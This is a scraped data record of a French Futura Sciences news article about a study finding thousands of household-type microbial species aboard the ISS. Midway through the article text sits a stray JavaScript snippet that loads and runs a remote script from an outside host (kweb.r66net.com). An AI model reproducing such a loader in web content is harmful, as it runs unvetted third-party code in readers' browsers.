{"title": "ISS : plus de 10.000 espèces vivent à bord de la Station spatiale", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "08/12/2017", "content": "L'être humain n'est pas la seule espèce à bord de la Station spatiale. L'analyse de plusieurs échantillons ont révélé la présence de plusieurs milliers d'espèces de bactéries que l'on a l'habitude de côtoyer dans nos maisons. Les chercheurs sont plutôt surpris. L'ISS comme si vous y étiez                       Embarquez à bord de la Station spatiale internationale (ISS) pour une visite complète en vue subjective. La caméra « fish-eye » nous fait entrer dans tous les modules, offrant des vues inédites. Bien sûr, la balade passe par Cupola, la baie vitrée sur l'espace... et la Terre.                                       Vous pensiez que l'être humain est la seule  espèce  à bord de la  Station spatiale internationale  (ISS) ? Loin s'en faut : une étude montre qu'il y aurait  « 12.554 espèces microbiennes différentes »  qui ont colonisé le laboratoire orbital, en plus de celles sciemment embarquées aux fins d'études. Les chercheurs sont surpris car les populations de  bactéries  identifiées sont davantage similaires à celles qui vivent à l'intérieur de nos maisons que dans nos corps... Surprenant, en effet, puisque tout ce qui arrive à bord de cette « maison » bâtie dans l'espace est stérilisé... Pour les  bactéries , l'unique moyen d'y pénétrer consiste à embarquer sur ses visiteurs humains (plus de 200 depuis les premiers occupants en 2000). Les chercheurs s'attendaient donc à ce que la population des microbes vivant à l'intérieur de la Station spatiale reflète celle du  microbiome  des passagers. Pas du tout. Soirée pizza pour tout l'équipage, début décembre 2017, à bord de la Station spatiale. © Nasa Faut-il s’inquiéter de cette prolifération de bactéries ? Les recherches reposent sur des échantillons prélevés en 2014 dans 15 endroits et objets différents à l'intérieur de la Station spatiale qui ressemblent le plus possible à ceux de nos intérieurs (microphones,  ordinateurs ,  portes , chaussures, etc.), même si les comparaisons sont nécessairement  « imparfaites » , selon les chercheurs eux-mêmes dans la revue  PeerJ  puisque la poussière ne s'accumule pas aux mêmes endroits en absence de pesanteur. Ils ont pour comparer utiliser les données du  Wildlife of Our Homes , qui a soigneusement enquêté sur les  micro-organismes  de nos intérieurs. Pour chercher des similitudes avec les  bactéries  intestinales, l'étude a utilisé les résultats du  Human  Microbiome  Project .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour la petite histoire, les prélèvements dans l'ISS, pour le compte de l'université UC Davis, ont été réalisés en contrepartie d'une expérience de science citoyenne, Merccuri pour  Microbial Ecology Research Combining Citizen and University Researchers on ISS , dans laquelle sont impliqués des scientifiques et ingénieurs par ailleurs supporters de la NFL et de la NBA. Il s'agissait d'emporter dans la Station spatiale des prélèvements effectués dans plusieurs stades, des gradins aux terrains, pour voir comment ces bactéries supporteraient le voyage... La vie d'une communauté microbienne est bien sûr un élément important à connaître pour de longs séjours d'humains dans l'espace, à l'heure où on se prépare à voyager vers la  Lune , Mars et au-delà... « Bien que différant significativement des maisons sur  Terre  et des échantillons du  Human Microbiome Project , la composition de la communauté microbienne sur l'ISS était plus similaire aux surfaces domestiques qu'aux échantillons de microbiome humain » , ont écrit les auteurs dans leur étude qui vient de paraître dans la revue  PeerJ . Voir aussi : Une bactérie découverte dans l'espace sur l'ISS Les chercheurs ont trouvé que ces surfaces d'ISS sont, chacun,  « riches de 1.036 à 4.294 unités taxonomiques opérationnelles (OTU) par échantillon » , des espèces connues sur Terre. Alors, faut-il s'inquiéter de cette prolifération bactérienne ? Pour l'un des auteurs, David Coil, pas du tout. C'est plutôt une bonne nouvelle :  « la diversité est généralement associée à un  écosystème  sain » , a-t-il déclaré, ajoutant que c'est plutôt la signature d'un vaisseau en bonne santé. ", "theme": "sciences"}